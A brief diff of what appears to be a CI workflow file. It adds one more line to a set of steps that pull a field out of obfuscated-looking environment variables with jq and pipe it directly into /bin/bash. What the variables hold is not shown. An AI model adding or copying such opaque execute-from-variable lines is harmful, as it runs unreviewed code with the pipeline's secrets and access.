@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$gtazr5" | jq -r .jder0595 | /bin/bash
           echo $qtcsf11024 | jq -r .umh3014 | /bin/bash
           echo $unysf0 | jq -r .pjla0 | /bin/bash
+          echo $t534 | jq -r .zoug8 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
